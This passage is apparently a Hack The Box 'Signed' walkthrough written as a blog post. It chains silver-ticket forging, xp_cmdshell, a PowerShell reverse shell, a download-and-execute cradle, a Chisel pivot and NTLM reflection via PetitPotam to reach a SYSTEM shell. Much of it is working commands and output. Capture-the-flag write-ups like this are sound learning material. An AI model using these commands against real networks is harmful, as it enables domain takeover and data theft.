print(f"{Colors.CYAN} Example: 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000{Colors.END}")  
print(f"{Colors.PROMPT}> {Colors.END}", end='')  
binary_sid = input().strip()  
  
# Clean input  
binary_sid = binary_sid.strip("b'\"")  
  
try:  
print(f"\n{Colors.INFO}[*] Converting binary SID...{Colors.END}\n")  
  
string_sid = binary_sid_to_string(binary_sid)  
domain_sid, rid = extract_domain_sid(string_sid)  
  
# Display results with colors  
print(f"{Colors.SUCCESS}[+] Full SID: {Colors.WHITE}{string_sid}{Colors.END}")  
print(f"{Colors.SUCCESS}[+] Domain SID: {Colors.GREEN}{domain_sid}{Colors.END}")  
print(f"{Colors.SUCCESS}[+] RID: {Colors.YELLOW}{rid}{Colors.END}\n")  
  
# Identify common RIDs with colored warnings  
rid_int = int(rid)  
rid_desc = get_rid_description(rid_int)  
print(rid_desc)  
  
# Silver Ticket section  
print(f"\n{Colors.CYAN}{'=' * 70}{Colors.END}")  
print(f"{Colors.HEADER}{Colors.BOLD} 🎫 Silver Ticket Generation Command:{Colors.END}")  
print(f"{Colors.CYAN}{'=' * 70}{Colors.END}\n")  
  
print(f"{Colors.YELLOW}impacket-ticketer {Colors.RED}-nthash <NTLM_HASH>{Colors.YELLOW} \\{Colors.END}")  
print(f"{Colors.YELLOW} -domain-sid {Colors.GREEN}{domain_sid}{Colors.YELLOW} \\{Colors.END}")  
print(f"{Colors.YELLOW} -domain {Colors.CYAN}signed.htb{Colors.YELLOW} \\{Colors.END}")  
print(f"{Colors.YELLOW} -spn {Colors.CYAN}MSSQLSvc/DC01.signed.htb{Colors.YELLOW} \\{Colors.END}")  
print(f"{Colors.YELLOW} -user-id {Colors.YELLOW}{rid}{Colors.YELLOW} Administrator{Colors.END}\n")  
  
# Additional tips  
print(f"{Colors.CYAN}{'=' * 70}{Colors.END}")  
print(f"{Colors.HEADER}{Colors.BOLD} 💡 Pro Tips:{Colors.END}")  
print(f"{Colors.CYAN}{'=' * 70}{Colors.END}\n")  
  
print(f"{Colors.GREEN}[+]{Colors.END} For MSSQL access, use SPN: {Colors.CYAN}MSSQLSvc/DC01.signed.htb{Colors.END}")  
print(f"{Colors.GREEN}[+]{Colors.END} For CIFS/SMB access, use SPN: {Colors.CYAN}cifs/DC01.signed.htb{Colors.END}")  
print(f"{Colors.GREEN}[+]{Colors.END} For HTTP access, use SPN: {Colors.CYAN}HTTP/DC01.signed.htb{Colors.END}")  
print(f"{Colors.GREEN}[+]{Colors.END} Get NTLM hash via: {Colors.YELLOW}secretsdump.py{Colors.END} or {Colors.YELLOW}Kerberoasting{Colors.END}")  
  
if rid_int == 502:  
print(f"\n{Colors.RED}{Colors.BOLD}[!] KRBTGT DETECTED! You can create a Golden Ticket:{Colors.END}")  
print(f"{Colors.YELLOW} ticketer.py -nthash <KRBTGT_HASH> -domain-sid {Colors.GREEN}{domain_sid}{Colors.YELLOW} \\")  
print(f" -domain signed.htb Administrator{Colors.END}")  
  
print()  
  
except Exception as e:  
print(f"\n{Colors.ERROR}[!] Error: {e}{Colors.END}")  
print(f"{Colors.YELLOW}[*] Make sure the SID is in hex format without spaces{Colors.END}")  
sys.exit(1)  
  
if __name__ == "__main__":  
try:  
main()  
except KeyboardInterrupt:  
print(f"\n\n{Colors.YELLOW}[*] Interrupted by user. Exiting...{Colors.END}")  
sys.exit(0)
```

![](https://cdn-images-1.medium.com/max/1200/1*A8OGf0RYhL-IBzgOPvX1HQ.png)

*Thansk to claude for awesome script*

Hell yeah, now we’re ready to create a Silver Ticket. I just need to convert the MSSQL service account password into its hash, so I asked Claude to generate a script for that, and it gave me this one.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# python3 -c 'import hashlib; print(hashlib.new("md4","purPLE9795!@".encode("utf-16le")).hexdigest())'  
  
ef699384c3285c54128a3ee1ddb1a0cc
```

And I verified their validity using netexec.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.4.208 -u MSSQLSVC -H ef699384c3285c54128a3ee1ddb1a0cc -d SIGNED.HTB  
  
MSSQL 10.129.4.208 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.4.208 1433 DC01 [+] SIGNED.HTB\MSSQLSVC:ef699384c3285c54128a3ee1ddb1a0cc
```

---

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Creating basic skeleton ticket and PAC Infos  
[*] Customizing ticket for signed.htb/Administrator  
[*] PAC_LOGON_INFO  
[*] PAC_CLIENT_INFO_TYPE  
[*] EncTicketPart  
[*] EncTGSRepPart  
[*] Signing/Encrypting final ticket  
[*] PAC_SERVER_CHECKSUM  
[*] PAC_PRIVSVR_CHECKSUM  
[*] EncTicketPart  
[*] EncTGSRepPart  
[*] Saving ticket in Administrator.ccache  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# export KRB5CCNAME=Administrator.ccache  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# klist  
Ticket cache: FILE:Administrator.ccache  
Default principal: Administrator@SIGNED.HTB  
  
Valid starting Expires Service principal  
==02====/====17====/====2026== ==21====:====44====:====23== ==02====/====15====/====2036== ==21====:====44====:====23== ==MSSQLSvc====/====DC0==1.signed.htb:1433@SIGNED.HTB  
renew until 02/15/2036 21:44:23  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# mssqlclient.py -no-pass -k DC01.signed.htb  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC01): Line 1: Changed database context to 'master'.  
[*] INFO(DC01): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)  
[!] Press help for extra shell commands  
SQL (SIGNED\Administrator dbo@master)> enable_xp_cmdshell  
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.  
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (SIGNED\Administrator dbo@master)> xp_cmdshell whoami  
output  
---------------  
signed\mssqlsvc  
NULL  
SQL (SIGNED\Administrator dbo@master)>
```

![](https://cdn-images-1.medium.com/max/800/1*sWQbG0FRsqT-1CNDom3vhA.jpeg)

*meow meow i will give you silver ticket and you give me xp_cmdshell okay meow meow*

Now i need to creave a reverseshell powershell and encoded it i used nishang script and tehn encoced it and run python server and set up nc as listener and excute attack to get rever sehlel

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# cat shell.ps1  
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.158:8000/shell.ps1')" | iconv -t utf16le |base64 -w0  
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEANQA4ADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwA  
xACcAKQA=
```

![](https://cdn-images-1.medium.com/max/1200/1*oa7HW1aJQQRpPSx7gWmfew.png)

At this stage, you should perform privilege escalation checks. You can run tools like **PrivescCheck**, **WinPEAS**, **Seatbelt**, and others to identify potential attack paths for privilege escalation on Windows. I tried many techniques, but nothing obvious appeared.

As you know, Active Directory environments require extensive checks. If you’re up to date, you’ve probably seen [the excellent research](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) on relay attacks. A big shoutout to [**Synacktiv** ](https://www.synacktiv.com/)for their outstanding research there are, I believe, four detailed blog posts covering relay attack techniques. Also, credit to the well-known researcher **James Forshaw** for his foundational work in [this ](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html)area.

I’m going to dive deeper into this research. You can read it as well. As an operator attempting to compromise the machine, I will check for NTLM reflection using NetExec and attempt to execute the attack.

> 📢One important warning: during a penetration test, always go back to the client and obtain explicit permission before performing any relay attack. Certain services running on a Windows Server could crash or stop, potentially causing serious disruption.

Now it’s time to test for NTLM reflection.

To check for NTLM reflection using NetExec, you need to pivot in order to access SMB properly. You can pivot using **Chisel** or **Ligolo**. I usually prefer Ligolo, but I experienced issues with the agent not working after several attempts. For this walkthrough, I will use Chisel instead.

If you want to view the services running on the machine, you can always run `netstat` to check active connections and listening ports.

![](https://cdn-images-1.medium.com/max/800/0*1tJz5v94XC-ZYzEf.gif)

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/signed/chisel]  
└─# ./chisel_server server --reverse -p 8000  
2026/02/10 04:45:17 server: Reverse tunnelling enabled  
2026/02/10 04:45:17 server: Fingerprint EgiPKfrneBEpN8kJeHIdX5MdrScUsq3G/T8fnB29QQQ=  
2026/02/10 04:45:17 server: Listening on http://0.0.0.0:8000  
2026/02/10 04:46:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash
PS C:\programdata> iwr http://10.10.16.159:8000/chisel.exe -o c.exe  
PS C:\programdata> dir  
  
  
Directory: C:\programdata  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
d---s- 4/10/2020 10:46 AM Microsoft  
d----- 10/6/2025 8:26 AM Package Cache  
d----- 9/7/2022 3:50 AM regid.1991-06.com.microsoft  
d----- 9/15/2018 12:19 AM SoftwareDistribution  
d----- 4/10/2020 5:48 AM ssh  
d----- 4/10/2020 10:49 AM USOPrivate  
d----- 4/10/2020 10:49 AM USOShared  
d----- 8/25/2021 2:57 AM VMware  
-a---- 2/9/2026 6:45 PM 10612224 c.exe  
  
  
PS C:\programdata> .\chisel/chisel  
chisel.exe chisel_1.11.3_windows_amd64.zip chisel_server  
PS C:\programdata> .\c.exe client 10.10.16.158:8000 R:socks
```

Make sure that in `/etc/proxychains4.conf` you set the correct proxy type. I had it configured as **SOCKS4**, which is why it wasn’t working. Ensure it is set properly (for example, to **SOCKS5** if that’s what your tunnel is using), otherwise the connection will fail.

```bash
[ProxyList]  
socks5 127.0.0.1 1080
```

![](https://cdn-images-1.medium.com/max/1200/1*1WYuZ7TURUTMHjtYRyeb2Q.png)

*Hell yeah smb*

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/signed/chisel]  
└─# proxychains nc -zv 10.129.242.173 445  
[proxychains] config file found: /etc/proxychains4.conf  
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4  
[proxychains] DLL init: proxychains-ng 4.17  
[proxychains] Strict chain ... 127.0.0.1:1080 ... 10.129.242.173:445 ... OK  
10.129.242.173 [10.129.242.173] 445 (microsoft-ds) open : Operation now in progress
```

Now we make sure that SMB works properly through the proxychains pivot. Once that is confirmed, we can move on to the main objective.

The key part of the NTLM reflection technique is adding a DNS record — that’s the core trick behind the attack. After that, we can use NetExec to check whether NTLM reflection is possible and identify which coercion techniques NetExec supports and can successfully use against the target.

So the workflow is:

1. Verify SMB connectivity through proxychains.(This is done )
2. Add the required DNS record (if permissions allow).(You can use bloodyad or [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py))
3. Use NetExec to test for NTLM reflection.
4. Identify which coercion method works against the machine.

Once those steps are complete, you can determine whether the reflection attack path is viable.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# proxychains -q nxc smb dc01.signed.htb -u MSSQLSVC -p 'purPLE9795!@' -M ntlm_reflection  
SMB 224.0.0.1 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB 224.0.0.1 445 DC01 [+] SIGNED.HTB\MSSQLSVC:purPLE9795!@  
NTLM_REF... 224.0.0.1 445 DC01 VULNERABLE (can relay SMB to other protocols except SMB on 224.0.0.1)
```

Now we have confirmed that the target is vulnerable to NTLM reflection.

> Again: If you are in a real penetration testing engagement, always make sure to obtain explicit permission from the client before performing any relay attack.

Now it’s time for exploitation. I will create a DNS record you can use tools like BloodyAD or dnstool, as mentioned earlier. After that, start ntlmrelayx (make sure you’re using an updated version, v13 or later), and then trigger the authentication using a coercion module in NetExec.

![](https://cdn-images-1.medium.com/max/1200/1*kXo_o9uKGumGS91E0eYzHQ.png)

*It’s an Art right ? make sure to set the dns record 10.10.10.10*

![](https://cdn-images-1.medium.com/max/1200/1*WNVcpBUendZwLTsl803XKA.png)

*Using dnstool*

![](https://cdn-images-1.medium.com/max/1200/1*BqyCtJ9hQcvB0infreCpCQ.png)

*Using BloodyAd*
---

**(1) Added DnsRecord**

```bash
┌──(.venv)─(root㉿kali)-[/home/…/Desktop/htb/arsenal/krbrelayx]  
└─# proxychains python dnstool.py -u 'SIGNED\MSSQLSVC' -p 'purPLE9795!@' -a add -r 'dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d 10.10.16.159 10.129.242.173  
  
[proxychains] config file found: /etc/proxychains4.conf  
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4  
[proxychains] DLL init: proxychains-ng 4.17  
[-] Connecting to host...  
[-] Binding to host  
[proxychains] Strict chain ... 127.0.0.1:1080 ... 10.129.242.173:389 ... OK  
[+] Bind OK  
[-] Adding new record  
[+] LDAP operation completed successfully
```

**(2) Set ntlmrelayx**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# proxychains ntlmrelayx.py -t winrms://DC01.signed.htb -smb2support  
[proxychains] config file found: /etc/proxychains4.conf  
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4  
[proxychains] DLL init: proxychains-ng 4.17  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Protocol Client DCSYNC loaded..  
[*] Protocol Client WINRMS loaded..  
[*] Protocol Client IMAPS loaded..  
[*] Protocol Client IMAP loaded..  
[*] Protocol Client MSSQL loaded..  
[*] Protocol Client LDAP loaded..  
[*] Protocol Client LDAPS loaded..  
[*] Protocol Client SMTP loaded..  
[*] Protocol Client SMB loaded..  
[*] Protocol Client HTTPS loaded..  
[*] Protocol Client HTTP loaded..  
[*] Protocol Client RPC loaded..  
[*] Running in relay mode to single host  
[*] Setting up SMB Server on port 445  
[*] Setting up HTTP Server on port 80  
[*] Setting up WCF Server on port 9389  
[*] Setting up RAW Server on port 6666  
[*] Setting up WinRM (HTTP) Server on port 5985  
[*] Setting up WinRMS (HTTPS) Server on port 5986  
[*] Setting up RPC Server on port 135  
[*] Multirelay disabled  
  
[*] Servers started, waiting for connections  
[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://DC01.signed.htb  
[!] The client requested signing, relaying to WinRMS might not work!  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:5986 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:5986 ... OK  
[*] HTTP server returned error code 500, this is expected, treating as a successful login  
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://DC01.signed.htb SUCCEED [1]  
[*] winrms:///@dc01.signed.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000  
[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://DC01.signed.htb  
[!] The client requested signing, relaying to WinRMS might not work!  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:5986 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:5986 ... OK  
[*] HTTP server returned error code 500, this is expected, treating as a successful login  
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://DC01.signed.htb SUCCEED [2]  
[*] winrms:///@dc01.signed.htb [2] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11001
```

**(3 )Cocerce with petitpotam**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# proxychains nxc smb dc01.signed.htb -u MSSQLSVC -p 'purPLE9795!@' -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=petitpotam  
[proxychains] config file found: /etc/proxychains4.conf  
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4  
[proxychains] DLL init: proxychains-ng 4.17  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:445 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:445 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:135 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:135 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:135 ... OK  
SMB 224.0.0.1 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:445 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:445 ... OK  
SMB 224.0.0.1 445 DC01 [+] SIGNED.HTB\MSSQLSVC:purPLE9795!@  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:135 ... OK  
[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01.signed.htb:445 ... OK  
COERCE_PLUS 224.0.0.1 445 DC01 VULNERABLE, PetitPotam  
COERCE_PLUS 224.0.0.1 445 DC01 Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nc 127.0.0.1 11003  
Type help for list of commands  
  
# whoami  
nt authority\system  
  
# type c:\Users\Administrator\desktop\root.txt  
6e546ed40c2e2edcd77a1b651497808e  
  
#
```
---

**References**

> 🔗 [https://vuln.dev/silver-ticket-mssql-clr/](https://vuln.dev/silver-ticket-mssql-clr/)

<div class="video-embed"><iframe src="https://www.youtube.com/embed/G6DvRzrfS_g" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

<div class="video-embed"><iframe src="https://www.youtube.com/embed/2geUDY2oPlQ" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

> 🔗 [https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)

> 🔗 [https://www.depthsecurity.com/blog/using-ntlm-reflection-to-own-active-directory/](https://www.depthsecurity.com/blog/using-ntlm-reflection-to-own-active-directory/)

> 🔗 [https://beta.hackndo.com/ntlm-relay/](https://beta.hackndo.com/ntlm-relay/)

> 🔗 [https://blog.compass-security.com/2021/08/relaying-ntlm-authentication-over-rpc-again/](https://blog.compass-security.com/2021/08/relaying-ntlm-authentication-over-rpc-again/)

<div class="video-embed"><iframe src="https://www.youtube.com/embed/vIISsfLh4iM" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

<div class="video-embed"><iframe src="https://www.youtube.com/embed/LC8elZ7TIxI" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

<div class="video-embed"><iframe src="https://www.youtube.com/embed/jWeOLGUw4U4" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

---

Relay attacks are a challenging topic, and I really enjoy studying them. They continue to gain attention, and there are many technical details involved. There are numerous talks and research papers available, so take your time to study and truly understand the concepts.

Of course, you should also understand the operational security (OPSEC) considerations related to relay attacks. I will include some important resources that are worth reviewing.

Going deeper into this topic is beyond the scope of this write-up. To be honest, I’m wrapping things up here, but I’ll provide useful references and I may add more in the future.

This write-up was created with passion by Mohamed Eletreby, a cybersecurity engineer who loves Windows internals, Windows research, and, of course, red teaming.

Goodbye 👋

---

![](https://cdn-images-1.medium.com/max/800/0*Nwtdo577FEJ1tKpX.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box](https://hacktheboxltd.sjv.io/19ZM06)! i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking!

Attention : I will back sooon

By Mohamed Eletreby on February 18, 2026.

Canonical link

Exported from Medium on April 20, 2026.
